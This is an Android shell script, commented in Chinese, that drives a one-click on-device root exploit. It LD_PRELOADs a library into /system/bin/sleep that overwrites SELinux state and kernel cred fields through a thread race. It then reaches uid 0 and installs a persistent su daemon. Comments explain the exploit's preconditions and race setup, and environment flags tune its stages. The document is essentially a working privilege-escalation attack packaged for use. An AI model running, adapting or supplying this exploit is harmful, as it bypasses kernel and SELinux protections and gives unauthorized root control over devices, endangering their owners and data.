#!/system/bin/sh
# device_root.sh —— 设备端一键 root，不需要电脑
#
#   sh /data/local/tmp/device_root.sh          # 后台跑
#   sh /data/local/tmp/device_root.sh wait     # 前台等它跑完
#
# 原理：LD_PRELOAD 把 preload.so 挂到 /system/bin/sleep 上，
# so 的 constructor 在 shell 上下文里跑完整条链：
#   round1 selinux  / round2 cred+0x30(prm) / round3 cred+0x40(bset)
#   → CAPS_FULL_FINISH 落 uid=0 → FAST_ROOT 装 su daemon
#
# 三条前提（缺一条就在 lpm_cpuidle_enter 崩）：
#   1) 三轮各用一个新线程（CLONE_THREAD 共享同一块 cred）
#   2) 该线程跑完常驻，不能退出（栈上钉着 fake rt_mutex）
#   3) 线程栈不被回收（不能 pthread_join）
#
# 产物：
#   /data/local/tmp/su                       客户端
#   /data/local/tmp/su_root/temp_su.sock     daemon socket
#   /data/local/tmp/exec_probe.txt           execve 后的能力回读
#
# 注意：设备重启后 SELinux 回 Enforcing，要再跑一次。

BIN=/data/local/tmp/exploit/aarch64
LOG=/data/local/tmp/runs/device_root.log

mkdir -p /data/local/tmp/runs 2>/dev/null
cd "$BIN" || { echo "no $BIN"; exit 1; }

[ -x ./preload.so ] || { echo "no preload.so in $BIN"; exit 1; }

# 上一轮的 daemon / 残留先清掉，否则 socket 会是旧的
pkill -f "su --daemon" 2>/dev/null
rm -f /data/local/tmp/su_root/temp_su.sock /data/local/tmp/exec_probe.txt

run() {
  echo "=== start $(date) enforce=$(getenforce 2>/dev/null)" > "$LOG"
  env SKIP_LEAK=1 PERF_CRED=1 PERF_TASK=1 \
      WRITE_PLAN=selinux,prmptr,bsetptr THREAD_RACE=1 ROUTE_ROUNDS=3 \
      STACK_LOCK=1 PARENT_PAINT=1 CAPS_FULL_FINISH=1 FAST_ROOT=1 INPROC_SU=1 \
      PSELECT_ROUTE_ATTEMPTS=2 PAGE_SETUP_ATTEMPTS=1 MM_SPRAY_SLABS=0 \
      LD_PRELOAD=./preload.so /system/bin/sleep 480 >> "$LOG" 2>&1
  echo "=== end $(date) rc=$?" >> "$LOG"
}

if [ "$1" = "wait" ]; then
  run
  echo "--- result"
  grep -a "round . caps\|caps-full setresuid\|FAST_ROOT daemon" "$LOG" | tail -6
  grep -m1 "CapEff" /data/local/tmp/exec_probe.txt 2>/dev/null
else
  run &
  echo "started in background, log=$LOG"
fi
